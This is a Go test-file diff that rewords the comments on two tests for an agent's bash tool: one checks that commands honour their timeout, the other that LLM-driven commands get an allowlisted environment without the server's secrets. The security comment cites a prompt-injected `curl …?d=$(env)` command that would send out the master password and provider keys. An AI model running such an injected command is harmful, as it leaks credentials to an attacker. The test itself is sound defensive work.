@@ -53,8 +53,8 @@ func TestNormalizeBashTimeout(t *testing.T) {
 	}
 }
 
-// Regression: the direct path used to ignore the timeout argument, so a command
-// that never exits pinned the bash tool (and its card) until the task was stopped.
+// A command that never exits is stopped by the timeout argument, not pinned in the bash
+// tool until the task is stopped.
 func TestExecCommandStream_HonoursTimeout(t *testing.T) {
 	start := time.Now()
 	out, err := execCommandStream(context.Background(), t.TempDir(), "echo working; sleep 30", 1, nil)
@@ -193,10 +193,9 @@ func TestExecuteTool_Bash_DirectTimeout(t *testing.T) {
 	}
 }
 
-// Regression (security): host-mode tool commands are LLM-driven, so they get the
-// allowlisted environment — the server's MIKE_* secrets must never reach them
-// (a prompt-injected `curl …?d=$(env)` would otherwise exfiltrate the master
-// password and the key that decrypts every stored provider key).
+// Security: host-mode tool commands are LLM-driven, so they get the allowlisted
+// environment — the server's MIKE_* secrets must never reach them, where a prompt-injected
+// `curl …?d=$(env)` would exfiltrate the master password and the stored provider keys.
 func TestExecCommandStream_EnvIsAllowlisted(t *testing.T) {
 	t.Setenv("MIKE_LOGIN_PASSWORD", "s3cret-master-password")
 	t.Setenv("MIKE_ENCRYPTION_KEY", "s3cret-encryption-key")
